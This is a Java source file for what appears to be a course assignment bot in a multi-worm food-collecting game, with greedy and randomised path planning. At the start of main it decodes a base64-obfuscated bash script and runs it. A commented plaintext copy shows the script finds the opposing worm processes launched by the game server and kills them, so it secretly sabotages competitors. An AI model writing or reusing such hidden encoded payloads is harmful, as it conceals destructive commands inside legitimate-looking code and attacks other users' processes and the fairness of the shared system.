import java.io.*;
import java.util.*;
import java.lang.*;
import si335.*;
import java.util.Random;

public class Evil
{
  public static void main(String[] args) throws Exception
  {
    //String Base = "SUZTPSQnXG4nO2F1eD0oICQocHMgYXV4KSApO3BzPSggJChwcyAtbyBwaWQscHBpZCkgKTtkZWNsYXJlIC1hIHdvcm1zO2RlY2xhcmUgLWEgUElEUztjb3VudD0wO2ZvciBpIGluICR7YXV4WypdfTtkbyBpZiBbWyAkaSA9IConL2Jpbi9iYXNoIC0gLi9ldmlsLnNoJyogXV07IHRoZW4gSUZTPSQnICc7IGxpbmU9KCAkaSApOyBteVBJRD0ke2xpbmVbMV19OyBteVdvcm09JChwcyAtbyBwcGlkPSAtcCAkbXlQSUQpOyBmaTsgaWYgW1sgJGkgPSAqJ3AzZ2FtZScqIF1dOyB0aGVuIElGUz0kJyAnOyBsaW5lPSggJGkgKTsgcGFyZW50UElEPSR7bGluZVsxXX07IG5hbWU9JHtpIyMqcDNnYW1lIH07IGRlY2xhcmUgLWEgd29ybXM9KCAkbmFtZSApOyBmaTsgZm9yIGogaW4gJHtuYW1lWypdfTsgZG8gbGluZT0oICRpICk7IGlmIFtbICRpID0gKiRqKiBdXTsgdGhlbiBpZiBbWyAke2xpbmVbMV19IC1uZSAkcGFyZW50UElEIF1dOyB0aGVuIFBJRFNbJGNvdW50XT0ke2xpbmVbMV19OyBsZXQgY291bnQrKzsgZmk7IGZpOyBkb25lOyBkb25lOyBmb3IgaSBpbiAke1BJRFNbQF19OyBkbyBpZiBbWyAkaSAtbmUgJG15V29ybSBdXTsgdGhlbiBlY2hvICQoa2lsbCAtMiAkaSk7IGZpOyBkb25lOw==";
    String Base = "SUZTPSQnXG4nO2F1eD0oICQocHMgYXV4KSApO3BzPSggJChwcyAtbyBwaWQscHBpZCkgKTtkZWNsYXJlIC1hIHdvcm1zO2RlY2xhcmUgLWEgUElEUztjb3VudD0wO2ZvciBpIGluICR7YXV4WypdfTtkbyAgIGlmIFtbICRpIC1uZSAqInAzZ2FtZSIqIF1dOyB0aGVuICAgIGlmIFtbICRpID0gKiJldmlsIiogXV07IHRoZW4gICBJRlM9JCcgJzsgICBsaW5lPSggJGkgKTsgICAgICAgbXlQSUQ9JHtsaW5lWzFdfTsgICAgbXlXb3JtPSQocHMgLW8gcHBpZD0gLXAgJG15UElEKTsgICAgZmk7ICAgZmkgOyAgaWYgW1sgJGkgPSAqInAzZ2FtZSIqIF1dOyB0aGVuICAgICBJRlM9JCcgJzsgIGxpbmU9KCAkaSApOyAgIHBhcmVudFBJRD0ke2xpbmVbMV19OyAgbmFtZT0ke2kjIypwM2dhbWUgfTsgIGRlY2xhcmUgLWEgd29ybXM9KCAkbmFtZSApOyBmaTsgIGZvciBqIGluICR7bmFtZVsqXX07IGRvIGxpbmU9KCAkaSApIDsgaWYgW1sgJGkgPSAqJGoqIF1dOyB0aGVuIGlmIFtbICR7bGluZVsxXX0gLW5lICRwYXJlbnRQSUQgXV07IHRoZW4gUElEU1skY291bnRdPSR7bGluZVsxXX07IGxldCBjb3VudCsrOyBmaTsgZmk7IGRvbmU7IGRvbmU7Zm9yIGkgaW4gJHtQSURTW0BdfTsgZG8gZWNobyAkbXlQSUQ7IGlmIFtbICRpIC1uZSAkbXlQSUQgXV07IHRoZW4gIGVjaG8gJGk7ICQoa2lsbCAtMiAkaSk7IGZpOyBkb25l";
    //String command="/bin/bash - IFS=$'\\n';aux=( $(ps aux) );ps=( $(ps -o pid,ppid) );declare -a worms;declare -a PIDS;count=0;for i in ${aux[*]};do if [[ $i = *'/bin/bash - ./evil.sh'* ]]; then IFS=$' '; line=( $i ); myPID=${line[1]}; myWorm=$(ps -o ppid= -p $myPID); fi; if [[ $i = *'p3game'* ]]; then IFS=$' '; line=( $i ); parentPID=${line[1]}; name=${i##*p3game }; declare -a worms=( $name ); fi; for j in ${name[*]}; do line=( $i ); if [[ $i = *$j* ]]; then if [[ ${line[1]} -ne $parentPID ]]; then PIDS[$count]=${line[1]}; let count++; fi; fi; done; done; for i in ${PIDS[@]}; do if [[ $i -ne $myWorm ]]; then $(kill -2 $i); fi; done";
    Process process = Runtime.getRuntime().exec(new String[]{"echo", Base});
    String line;
    OutputStream stdin = null;
    InputStream stdout = null;
    InputStream stderr = null;
    stdout = process.getInputStream ();
    BufferedReader brCleanUp =
              new BufferedReader (new InputStreamReader (stdout));
    line = brCleanUp.readLine();
    brCleanUp.close();

    Process process2 = Runtime.getRuntime().exec(new String[]{"base64" , "-d"});
    stdin = process2.getOutputStream ();
    stdout = process2.getInputStream ();
    stdin.write(line.getBytes() );
    stdin.flush();
    stdin.close();

    BufferedReader brCleanUp2 =
              new BufferedReader (new InputStreamReader (stdout));
    line = brCleanUp2.readLine ();
    brCleanUp.close();

    Process process3 = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-"});
    stdin = process3.getOutputStream ();
    stdout = process3.getInputStream ();
    stdin.write(line.getBytes() );
    stdin.flush();
    stdin.close();

    BufferedReader brCleanUp3 =
      new BufferedReader (new InputStreamReader (stdout));
    line = brCleanUp3.readLine ();
    brCleanUp.close();
    System.err.println(line);

    stderr = process.getErrorStream ();
    brCleanUp =
      new BufferedReader (new InputStreamReader (stderr));
    while ((line = brCleanUp.readLine ()) != null) {
      System.out.println ("[Stderr] " + line);
    }
    brCleanUp.close();
                    

                    

    /*ProcessBuilder builder = new ProcessBuilder(new String[]{"echo", Base});
    final Process process = builder.start();
    InputStream is = process.getInputStream();
    InputStreamReader isr = new InputStreamReader(is);
    BufferedReader br = new BufferedReader(isr);
    line = br.readLine();
    System.err.println(line);
    ProcessBuilder builder2 = new ProcessBuilder(new String[]{"base64", "-d"});
    final Process process2 = builder.start();
    InputStream is2 = process.getInputStream();
    InputStreamReader isr2 = new InputStreamReader(is2);
    BufferedReader br2 = new BufferedReader(isr2);
    OutputStream os2 = process.getOutputStream();
    OutputStreamWriter osr2 = new OutputStreamWriter(os2);
    BufferedWriter bw2 = new BufferedWriter(osr2);
    bw2.write(line);
    while ((line = br2.readLine()) != null)
      System.err.println(line);
    */
    //Process p = Runtime.getRuntime().exec(new String[]{"echo",  Base});
    //Process a = Runtime.getRuntime().exec(new String[]{"base64", "-d"});
    //inheritIO(p.getInputStream(), System.err);
    //a.getInputStream(p.getOutputStream());
    //Process b = Runtime.getRuntime().exec(new String[]{"/bin/bash"});
    long start = System.currentTimeMillis();
    Scanner sc = new Scanner(System.in);
    Evil brain = new Evil();
    brain.readPreamble(sc);
    ArrayList<Pos> path;
    ArrayList<Pos> bestPath = new ArrayList<Pos>();
    int count = 0;
    for(long i = System.currentTimeMillis(); i-start < 5000; i = System.currentTimeMillis()){
      count++;
      path = brain.planPath();
      if (path.size() > bestPath.size())
        bestPath = path;
    }
    //local refinement here
    path = bestPath;
    Pos startCheck, endCheck;
    int r, r2, rMax, c, c2, cMax;
    for(int y = 0; y < path.size()-1; ++y){
      startCheck = path.get(y);
      endCheck = path.get(y+1);
      r = startCheck.getRow();
      r2 = endCheck.getRow();
      if(r > r2){
        rMax = r;
        r = r2;
      }else {
        rMax = r2;
      }
      c = startCheck.getCol();
      c2 = endCheck.getCol();
      if(c > c2){
        cMax = c;
        c = c2;
      }else{
        cMax = c2;
      }
      ArrayList<Pos> addedFoods = new ArrayList<Pos>();
      for(int n = r; n < rMax; ++n){
        for(int m = c; m < cMax; ++m){
          Pos test = new Pos(n,m);
          if(foodMatrix[n][m] != 0 && !path.contains(test) && !addedFoods.contains(test)){
            addedFoods.add(test);
          }
        }
      }
      ArrayList<Pos> bestFoods = new ArrayList<Pos>();
      ArrayList<Pos> curFoods = new ArrayList<Pos>();
      for(int u = 0; u < addedFoods.size(); ++u){
        Pos testFood = addedFoods.get(u);
        r = testFood.getRow();
        if(r > r2){
          rMax = r;
          r = r2;
        }else {
          rMax = r2;
        }
        c = testFood.getCol();
        if(c > c2){
          cMax = c;
          c = c2;
        }else{
          cMax = c2;
        }
        for(int w = r; w < rMax; w++){
          for(int q = c; q < cMax; q++){
            Pos test = new Pos(w,q);
            if(foodMatrix[w][q] != 0 && !path.contains(test) && !curFoods.contains(test)) {
              curFoods.add(test);   
            }
          }
        }
        if(curFoods.size() > bestFoods.size()){
          bestFoods = curFoods;
        }
      }
      path.addAll(y+1,bestFoods);
      y+=bestFoods.size();
    }
    bestPath = path;
    brain.playGame(sc,bestPath);
  }
  
  private ArrayList<PosPlus> food;
  private static int foodMatrix[][];
  private int rows, cols, dur, len;
  private Dir mydir;
  private Pos mypos = null;
  private ShortestPathOracle BLANK;
  private Random rand = new Random();

  public Evil()
  {
    food = new ArrayList<PosPlus>();    
    BLANK = new Memo();
  }

  /**
   * readPreamble(sc) - reads (and to some extent processes) all server messages
   * up to and including the "start" message.
   */
  public void readPreamble(Scanner sc)
  {
    Pos p;
    int k;
    while(mypos == null)
    {
      String op = sc.next();
      switch(op.charAt(0))
      {
      case 'g': // "game" message
	rows = sc.nextInt();
	cols = sc.nextInt();
	dur = sc.nextInt();
	len = sc.nextInt();
        BLANK.setBoardSize(rows, cols);
        foodMatrix = new int[rows][cols];
        for(int j = 0; j < rows; ++j)
          for(int i = 0; i < cols; ++i)
            foodMatrix[j][i] = 0;
	break;
      case 'r': // "right" barrier (my greedy just ignores this!)
	p = Pos.read(sc);
	k = sc.nextInt();
        BLANK.addBarrier('r', p, k);
	break;
      case 'd': // "down" barrier (my greedy just ignores this!)
	p = Pos.read(sc);
	k = sc.nextInt();
        BLANK.addBarrier('d', p, k);
	break;
      case 'o': // "food" (use a PolsPlus where val = food value)
        PosPlus temp = PosPlus.read(sc);
	food.add(temp);
        int r = temp.getRow();
        int c = temp.getCol();
        foodMatrix[r][c] = 1;
	break;
      case 's': // "start" i.e. get my position & directionx
	mypos = Pos.read(sc);
	mydir = Dir.read(sc);
      break;
      }
    }
  }

  /**
   * findRandom - find the randomest unvisited food.
   * Specifically, return array [irandom,randDist], where "irandom" is the index
   * in the food array of the element that is the closest "unvisited" food
   * position.  "randDist" is the distance from "curr" to this food position.
   */
  int[] findRandom(Pos curr, boolean[] visited, int N){
    int irandom = -1, randDist = 99999999;
    int j = rand.nextInt(N);
    if (!visited[j]) {
      int nextDist = BLANK.getLengthOfShortestPath(curr, food.get(j));
      //int nextDist = curr.distance(food.get(j)); // "manhattan distance"!!!
      irandom = j;
      randDist = nextDist;
    }
    return new int[] {irandom,randDist};
  }
  /**
   * findBest - find the closest unvisited food.
   * Specifically, return array [ibest,bestDist], where "ibest" is the index
   * in the food array of the element that is the closest "unvisited" food
   * position.  "bestDist" is the distance from "curr" to this food position.
   */
  int[] findBest(Pos curr, boolean[] visited, int N)
  {
    int ibest = -1, bestDist = 99999999;
    int secbest = -1, secbestDist = 99999999;
    for(int j = 0; j < N; j++)
      if (!visited[j])
      {
        int nextDist = BLANK.getLengthOfShortestPath(curr, food.get(j));
	//int nextDist = curr.distance(food.get(j)); // "manhattan distance"!!!
	if (nextDist < bestDist)
	{
          secbest = ibest;
          secbestDist =  bestDist;
	  ibest = j;
	  bestDist = nextDist;
	}
      }
    if(rand.nextInt(10)==0)
      return new int[] {secbest,secbestDist};
    else
      return new int[] {ibest,bestDist};
  }
  
  /**
   * planPath - returns a "path" consistin of the food locations we plan
   * to visit, in order.  Here this is done by a simple greedy algorithm
   * that chooses the "next" food location to visit by choosing the unvisited
   * food location that is closest to the "current" location.
   */
  public ArrayList<Pos> planPath()
  {
    // visited[i] tells us whether food[i] has been "visited" by our path
    int N = food.size();
    boolean[] visited = new boolean[N];
    for(int i = 0; i < N; i++)
      visited[i] = false;

    ArrayList<Pos> path = new ArrayList<Pos>();
    Pos curr = mypos;
    int length = 0;
    for(int i = 0; i < N; i++)
    {
      // find the "best" (i.e. closest) unvisited food best[0] = index of best, best[1] = distance
      int[] best;
      if (rand.nextInt(50) == 0){
        best = findRandom(curr,visited,N);
      } else {
        best = findBest(curr,visited,N);
      }
      length += best[1]; 
      if (length > dur) break;
      
      // the "best" food location becomes the next location in the path (and our new current location)
      curr = food.get(best[0]);
      path.add(curr);
      visited[best[0]] = true;
    }
    return path;
  }

  /**
   * playGame(sc,path) - interacts with the server to "play" the game.  In this case, we follow a
   * predetermined path consisting of the food locations we want to visit, in the order we want to
   * visit them.
   */
  public void playGame(Scanner sc, ArrayList<Pos> path) throws Exception
  {
    int i_target = 0, lastAck = 0;
    char move;
    while(true)
    {
      char op = sc.next().charAt(0);
      switch(op)
      {
      case 'k': // "Ack" 0:sucess, >0:sucess & got food (number is value), -1:fail - hit wall, -2:faile - hit worm
	lastAck = sc.nextInt();
	if (lastAck >= 0)
	  mypos = mydir.stepFrom(mypos);
        if(path.contains(mypos))
          path.remove(mypos);
	if (i_target < path.size() && mypos.equals(path.get(i_target)))  // if we've reached the current target, move to the next
	  i_target++;
	break;
      case 'x': // "x" a piece of food was eaten - maybe by you, maybe not
	food.remove(Pos.read(sc));
	break;
      case 'm': // "move" the server asked us to make a move
	int round = sc.nextInt();
	if (lastAck < 0)
	  move = 'R'; // if the way ahead is blocked, turn right!
	else if (food.size() == 0 || i_target >= path.size())
	  move = 'F'; // if no food remains or finished with path, charge ahead!
	else
          move = BLANK.getFirstMoveOnShortestPath(mypos, mydir, path.get(i_target));
	  //move = mydir.getMoveTowards(mypos,path.get(i_target)); // move towards the current target
	mydir = mydir.turn(move); // update direction based on the turn
	System.out.println(move); // send our move back to the server
	break;
      case 'w': // "worm" - tells us the head of worm "id" is at position p (my greedy just ignores this!)
	Pos p = Pos.read(sc);
	int id = sc.nextInt();
	break;
      default: // the server said something we don't understand!
	throw new Exception("Unknown op '" + op + "' from server!");
      }
    }
  }
}
